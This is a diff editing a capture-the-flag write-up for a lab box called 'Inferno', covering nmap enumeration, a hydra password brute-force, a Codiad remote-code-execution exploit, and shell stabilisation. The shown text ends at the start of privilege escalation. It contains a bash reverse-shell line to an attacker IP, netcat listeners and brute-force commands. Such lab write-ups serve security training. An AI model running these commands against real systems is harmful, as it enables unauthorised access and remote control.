@@ -1,6 +1,6 @@
-##Inferno
+## Inferno
 
-#Enumeration
+# Enumeration
 ```
 # Nmap 7.91 scan initiated Mon May  3 15:28:32 2021 as: nmap -sCV -oN nmap/initial -vvv -p 23,25,21,22,88,80,106,110,194,389,443,464,636,750,777,775,808,779,783,873,1178,1210,1236,1313,1300,1314,1529,2003,2000,2121,2150,2606,2607,2603,2600,2601,2602,2608,2605,2604,2989,2988,1001,4224,4559,4557,4600,4949,5052,5051,5151,5355,5354,5432,5555,5666,5667,5674,5675,5680,6346,6514,6566,6667,8021,8081,8088,8990,9098,9359,9418,9673,10000,10083,10082,10081,11201,15345,17003,17004,17002,17001,20011,20012,24554,27374,30865,57000,60179,60177 10.10.67.42
 Nmap scan report for 10.10.67.42
@@ -122,7 +122,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 There are quite a few ports open on the system however only the ssh port and http server port on 22 and 80 respectively can be verified to be running so lets start with those.
 
-#Web Server Port 80
+# Web Server Port 80
 ```
 Oh quanto parve a me gran maraviglia
 quand'io vidi tre facce a la sua testa!
@@ -141,8 +141,9 @@ admin
 administrator
 dante
 inferno
-
-# hydra -t 64 -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.67.42 http-get /inferno
+```
+```
+hydra -t 64 -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.67.42 http-get /inferno
 ```
 We end up finding a valid password for the admin user, so lets use the credentials. We are immediately presented another login page, however thankfully our credentials work again.
 
@@ -150,7 +151,7 @@ It seems we have gained access to web IDE called codiad, we can poke around with
 ```
 python2 Codiad-Remote-Code-Execute-Exploit/exploit.py http://admin:redacted@10.10.67.42/inferno/ 'admin' 'redacted' 10.13.1.12 8888 linux
 [+] Please execute the following command on your vps:
-echo 'bash -c "bash -i >/dev/tcp/10.13.1.12/8889 0>&1 2>&1"' | nc -lnvp 8888
+echo 'bash -c "bash -i >/dev/tcp/IP/PORT 0>&1 2>&1"' | nc -lnvp 8888
 nc -lnvp 8889
 [+] Please confirm that you have done the two command above [y/n]
 [Y/n] y
@@ -165,16 +166,7 @@ nc -lnvp 8889
 [+] Exploit finished!
 [+] Enjoy your reverse shell!
 ```
-We get a shell however we cannot maintain a persistant shell as something is set to kill bash shells at regular increments
-```
-# nc -lnvp 8889
-listening on [any] 8889 ...
-connect to [10.13.1.12] from (UNKNOWN) [10.10.67.42] 60794
-bash: cannot set terminal process group (913): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@Inferno:/var/www/html/inferno/components/filemanager$ exit
-```
-We can workaround this however by stabalizing our shell with /bin/sh instead of /bin/bash as follows
+We get a shell however we cannot maintain a persistant shell as something is set to kill bash shells at regular increments. We can workaround this however by stabalizing our shell with /bin/sh instead of /bin/bash as follows
 ```
 python3 -c "import pty;pty.spawn('/bin/sh')"
 export TERM=xterm;export SHELL=/bin/sh
@@ -183,7 +175,7 @@ stty raw -echo; fg
 ```
 Now we won't be booted off the system and cant start to finally look around.
 
-#Initial Foothold
+# Initial Foothold
 We are currently the www-data user however we can access the /home/dante directory however we can read the local.txt flag that is present. So we explore what other files are accessible.
 We find several files on the system that we could begin to take a look at but after quickly looking through all of them we find a immediate standout in /home/dante/Downloads/.download.dat which appears to be a hexdump, that when converted contains the following
 ```
@@ -207,7 +199,7 @@ dante:redacted
 ```
 Looks like some credentials were placed here for dante so lets switch over to dante and get the local.txt flag. We again run into the same problem as before where our bash shell is killed even if we connect over ssh so we just need to stabalize with a /bin/sh shell instead and we can proceed
 
-#Privilege Escalation
+# Privilege Escalation
 ```
 $ sudo -l
 Matching Defaults entries for dante on Inferno:
